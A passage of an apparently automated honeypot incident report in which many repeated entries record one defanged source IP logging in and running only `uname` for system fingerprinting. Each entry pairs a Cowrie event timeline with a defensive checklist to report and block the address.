- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1400ea8256f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:34 |
| **Last Seen** | 2026-07-30 16:34 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:34:17` | `cowrie.session.connect` |
| `2026-07-30 16:34:18` | `cowrie.client.version` |
| `2026-07-30 16:34:18` | `cowrie.client.kex` |
| `2026-07-30 16:34:21` | `cowrie.login.success` |
| `2026-07-30 16:34:23` | `cowrie.session.params` |
| `2026-07-30 16:34:23` | `cowrie.command.input` |
| `2026-07-30 16:34:24` | `cowrie.log.closed` |
| `2026-07-30 16:34:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1df42f202af2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:34 |
| **Last Seen** | 2026-07-30 16:34 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:34:23` | `cowrie.session.connect` |
| `2026-07-30 16:34:23` | `cowrie.client.version` |
| `2026-07-30 16:34:23` | `cowrie.client.kex` |
| `2026-07-30 16:34:27` | `cowrie.login.success` |
| `2026-07-30 16:34:29` | `cowrie.session.params` |
| `2026-07-30 16:34:29` | `cowrie.command.input` |
| `2026-07-30 16:34:29` | `cowrie.log.closed` |
| `2026-07-30 16:34:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-747197651543

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:34 |
| **Last Seen** | 2026-07-30 16:34 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:34:30` | `cowrie.session.connect` |
| `2026-07-30 16:34:30` | `cowrie.client.version` |
| `2026-07-30 16:34:30` | `cowrie.client.kex` |
| `2026-07-30 16:34:32` | `cowrie.login.success` |
| `2026-07-30 16:34:34` | `cowrie.session.params` |
| `2026-07-30 16:34:34` | `cowrie.command.input` |
| `2026-07-30 16:34:34` | `cowrie.log.closed` |
| `2026-07-30 16:34:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83969cbfb72f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:34 |
| **Last Seen** | 2026-07-30 16:34 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:34:36` | `cowrie.session.connect` |
| `2026-07-30 16:34:36` | `cowrie.client.version` |
| `2026-07-30 16:34:36` | `cowrie.client.kex` |
| `2026-07-30 16:34:38` | `cowrie.login.success` |
| `2026-07-30 16:34:40` | `cowrie.session.params` |
| `2026-07-30 16:34:40` | `cowrie.command.input` |
| `2026-07-30 16:34:40` | `cowrie.log.closed` |
| `2026-07-30 16:34:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6241c6097fdf

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:34 |
| **Last Seen** | 2026-07-30 16:34 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:34:42` | `cowrie.session.connect` |
| `2026-07-30 16:34:42` | `cowrie.client.version` |
| `2026-07-30 16:34:42` | `cowrie.client.kex` |
| `2026-07-30 16:34:44` | `cowrie.login.success` |
| `2026-07-30 16:34:46` | `cowrie.session.params` |
| `2026-07-30 16:34:46` | `cowrie.command.input` |
| `2026-07-30 16:34:46` | `cowrie.log.closed` |
| `2026-07-30 16:34:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-770edd22e14f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:34 |
| **Last Seen** | 2026-07-30 16:34 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:34:48` | `cowrie.session.connect` |
| `2026-07-30 16:34:48` | `cowrie.client.version` |
| `2026-07-30 16:34:48` | `cowrie.client.kex` |
| `2026-07-30 16:34:49` | `cowrie.login.success` |
| `2026-07-30 16:34:50` | `cowrie.session.params` |
| `2026-07-30 16:34:50` | `cowrie.command.input` |
| `2026-07-30 16:34:50` | `cowrie.log.closed` |
| `2026-07-30 16:34:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03c5f0a29d1a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:34 |
| **Last Seen** | 2026-07-30 16:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:34:54` | `cowrie.session.connect` |
| `2026-07-30 16:34:55` | `cowrie.client.version` |
| `2026-07-30 16:34:55` | `cowrie.client.kex` |
| `2026-07-30 16:34:55` | `cowrie.login.success` |
| `2026-07-30 16:34:56` | `cowrie.session.params` |
| `2026-07-30 16:34:56` | `cowrie.command.input` |
| `2026-07-30 16:34:56` | `cowrie.log.closed` |
| `2026-07-30 16:34:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-caa93a66218a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:35 |
| **Last Seen** | 2026-07-30 16:35 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:35:01` | `cowrie.session.connect` |
| `2026-07-30 16:35:01` | `cowrie.client.version` |
| `2026-07-30 16:35:01` | `cowrie.client.kex` |
| `2026-07-30 16:35:02` | `cowrie.login.success` |
| `2026-07-30 16:35:03` | `cowrie.session.params` |
| `2026-07-30 16:35:03` | `cowrie.command.input` |
| `2026-07-30 16:35:03` | `cowrie.log.closed` |
| `2026-07-30 16:35:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e39f3db1a0d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:35 |
| **Last Seen** | 2026-07-30 16:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:35:07` | `cowrie.session.connect` |
| `2026-07-30 16:35:07` | `cowrie.client.version` |
| `2026-07-30 16:35:07` | `cowrie.client.kex` |
| `2026-07-30 16:35:07` | `cowrie.login.success` |
| `2026-07-30 16:35:08` | `cowrie.session.params` |
| `2026-07-30 16:35:08` | `cowrie.command.input` |
| `2026-07-30 16:35:08` | `cowrie.log.closed` |
| `2026-07-30 16:35:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c402efd8e7f2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:35 |
| **Last Seen** | 2026-07-30 16:35 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:35:12` | `cowrie.session.connect` |
| `2026-07-30 16:35:12` | `cowrie.client.version` |
| `2026-07-30 16:35:12` | `cowrie.client.kex` |
| `2026-07-30 16:35:13` | `cowrie.login.success` |
| `2026-07-30 16:35:14` | `cowrie.session.params` |
| `2026-07-30 16:35:14` | `cowrie.command.input` |
| `2026-07-30 16:35:14` | `cowrie.log.closed` |
| `2026-07-30 16:35:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23ee78743a1b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:35 |
| **Last Seen** | 2026-07-30 16:35 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:35:18` | `cowrie.session.connect` |
| `2026-07-30 16:35:18` | `cowrie.client.version` |
| `2026-07-30 16:35:18` | `cowrie.client.kex` |
| `2026-07-30 16:35:19` | `cowrie.login.success` |
| `2026-07-30 16:35:20` | `cowrie.session.params` |
| `2026-07-30 16:35:20` | `cowrie.command.input` |
| `2026-07-30 16:35:20` | `cowrie.log.closed` |
| `2026-07-30 16:35:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cac8263ccba2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:35 |
| **Last Seen** | 2026-07-30 16:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:35:24` | `cowrie.session.connect` |
| `2026-07-30 16:35:24` | `cowrie.client.version` |
| `2026-07-30 16:35:24` | `cowrie.client.kex` |
| `2026-07-30 16:35:25` | `cowrie.login.success` |
| `2026-07-30 16:35:25` | `cowrie.session.params` |
| `2026-07-30 16:35:25` | `cowrie.command.input` |
| `2026-07-30 16:35:25` | `cowrie.log.closed` |
| `2026-07-30 16:35:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0927731f8b83

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:35 |
| **Last Seen** | 2026-07-30 16:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:35:30` | `cowrie.session.connect` |
| `2026-07-30 16:35:30` | `cowrie.client.version` |
| `2026-07-30 16:35:30` | `cowrie.client.kex` |
| `2026-07-30 16:35:30` | `cowrie.login.success` |
| `2026-07-30 16:35:31` | `cowrie.session.params` |
| `2026-07-30 16:35:31` | `cowrie.command.input` |
| `2026-07-30 16:35:32` | `cowrie.log.closed` |
| `2026-07-30 16:35:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65f3ca599e49

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:35 |
| **Last Seen** | 2026-07-30 16:35 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:35:35` | `cowrie.session.connect` |
| `2026-07-30 16:35:36` | `cowrie.client.version` |
| `2026-07-30 16:35:36` | `cowrie.client.kex` |
| `2026-07-30 16:35:37` | `cowrie.login.success` |
| `2026-07-30 16:35:38` | `cowrie.session.params` |
| `2026-07-30 16:35:38` | `cowrie.command.input` |
| `2026-07-30 16:35:38` | `cowrie.log.closed` |
| `2026-07-30 16:35:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2c9f48dba3b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:35 |
| **Last Seen** | 2026-07-30 16:35 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:35:41` | `cowrie.session.connect` |
| `2026-07-30 16:35:41` | `cowrie.client.version` |
| `2026-07-30 16:35:41` | `cowrie.client.kex` |
| `2026-07-30 16:35:42` | `cowrie.login.success` |
| `2026-07-30 16:35:43` | `cowrie.session.params` |
| `2026-07-30 16:35:43` | `cowrie.command.input` |
| `2026-07-30 16:35:43` | `cowrie.log.closed` |
| `2026-07-30 16:35:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e21735c7e072

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:35 |
| **Last Seen** | 2026-07-30 16:35 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:35:48` | `cowrie.session.connect` |
| `2026-07-30 16:35:48` | `cowrie.client.version` |
| `2026-07-30 16:35:48` | `cowrie.client.kex` |
| `2026-07-30 16:35:49` | `cowrie.login.success` |
| `2026-07-30 16:35:50` | `cowrie.session.params` |
| `2026-07-30 16:35:50` | `cowrie.command.input` |
| `2026-07-30 16:35:50` | `cowrie.log.closed` |
| `2026-07-30 16:35:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d43a6e065eea

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:35 |
| **Last Seen** | 2026-07-30 16:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:35:54` | `cowrie.session.connect` |
| `2026-07-30 16:35:54` | `cowrie.client.version` |
| `2026-07-30 16:35:54` | `cowrie.client.kex` |
| `2026-07-30 16:35:55` | `cowrie.login.success` |
| `2026-07-30 16:35:55` | `cowrie.session.params` |
| `2026-07-30 16:35:55` | `cowrie.command.input` |
| `2026-07-30 16:35:56` | `cowrie.log.closed` |
| `2026-07-30 16:35:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-365e933155f6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:36 |
| **Last Seen** | 2026-07-30 16:36 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:36:00` | `cowrie.session.connect` |
| `2026-07-30 16:36:00` | `cowrie.client.version` |
| `2026-07-30 16:36:00` | `cowrie.client.kex` |
| `2026-07-30 16:36:01` | `cowrie.login.success` |
| `2026-07-30 16:36:02` | `cowrie.session.params` |
| `2026-07-30 16:36:02` | `cowrie.command.input` |
| `2026-07-30 16:36:02` | `cowrie.log.closed` |
| `2026-07-30 16:36:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0eeac43753f2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:36 |
| **Last Seen** | 2026-07-30 16:36 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:36:06` | `cowrie.session.connect` |
| `2026-07-30 16:36:06` | `cowrie.client.version` |
| `2026-07-30 16:36:06` | `cowrie.client.kex` |
| `2026-07-30 16:36:07` | `cowrie.login.success` |
| `2026-07-30 16:36:08` | `cowrie.session.params` |
| `2026-07-30 16:36:08` | `cowrie.command.input` |
| `2026-07-30 16:36:08` | `cowrie.log.closed` |
| `2026-07-30 16:36:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb8132431803

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:36 |
| **Last Seen** | 2026-07-30 16:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:36:12` | `cowrie.session.connect` |
| `2026-07-30 16:36:12` | `cowrie.client.version` |
| `2026-07-30 16:36:12` | `cowrie.client.kex` |
| `2026-07-30 16:36:12` | `cowrie.login.success` |
| `2026-07-30 16:36:13` | `cowrie.session.params` |
| `2026-07-30 16:36:13` | `cowrie.command.input` |
| `2026-07-30 16:36:13` | `cowrie.log.closed` |
| `2026-07-30 16:36:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f2513e2706d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:36 |
| **Last Seen** | 2026-07-30 16:36 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:36:18` | `cowrie.session.connect` |
| `2026-07-30 16:36:18` | `cowrie.client.version` |
| `2026-07-30 16:36:18` | `cowrie.client.kex` |
| `2026-07-30 16:36:19` | `cowrie.login.success` |
| `2026-07-30 16:36:20` | `cowrie.session.params` |
| `2026-07-30 16:36:20` | `cowrie.command.input` |
| `2026-07-30 16:36:20` | `cowrie.log.closed` |
| `2026-07-30 16:36:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cfad302960af

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:36 |
| **Last Seen** | 2026-07-30 16:36 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:36:24` | `cowrie.session.connect` |
| `2026-07-30 16:36:24` | `cowrie.client.version` |
| `2026-07-30 16:36:24` | `cowrie.client.kex` |
| `2026-07-30 16:36:25` | `cowrie.login.success` |
| `2026-07-30 16:36:26` | `cowrie.session.params` |
| `2026-07-30 16:36:26` | `cowrie.command.input` |
| `2026-07-30 16:36:26` | `cowrie.log.closed` |
| `2026-07-30 16:36:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9fcc417aa0bd

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:36 |
| **Last Seen** | 2026-07-30 16:36 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:36:30` | `cowrie.session.connect` |
| `2026-07-30 16:36:30` | `cowrie.client.version` |
| `2026-07-30 16:36:30` | `cowrie.client.kex` |
| `2026-07-30 16:36:31` | `cowrie.login.success` |
| `2026-07-30 16:36:32` | `cowrie.session.params` |
| `2026-07-30 16:36:32` | `cowrie.command.input` |
| `2026-07-30 16:36:32` | `cowrie.log.closed` |
| `2026-07-30 16:36:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76264b14cbb8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:36 |
| **Last Seen** | 2026-07-30 16:36 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:36:35` | `cowrie.session.connect` |
| `2026-07-30 16:36:35` | `cowrie.client.version` |
| `2026-07-30 16:36:35` | `cowrie.client.kex` |
| `2026-07-30 16:36:36` | `cowrie.login.success` |
| `2026-07-30 16:36:38` | `cowrie.session.params` |
| `2026-07-30 16:36:38` | `cowrie.command.input` |
| `2026-07-30 16:36:38` | `cowrie.log.closed` |
| `2026-07-30 16:36:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a7ac1bfeb4f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:36 |
| **Last Seen** | 2026-07-30 16:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:36:41` | `cowrie.session.connect` |
| `2026-07-30 16:36:41` | `cowrie.client.version` |
| `2026-07-30 16:36:41` | `cowrie.client.kex` |
| `2026-07-30 16:36:41` | `cowrie.login.success` |
| `2026-07-30 16:36:42` | `cowrie.session.params` |
| `2026-07-30 16:36:42` | `cowrie.command.input` |
| `2026-07-30 16:36:42` | `cowrie.log.closed` |
| `2026-07-30 16:36:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8689c2973a09

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:36 |
| **Last Seen** | 2026-07-30 16:36 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:36:47` | `cowrie.session.connect` |
| `2026-07-30 16:36:47` | `cowrie.client.version` |
| `2026-07-30 16:36:47` | `cowrie.client.kex` |
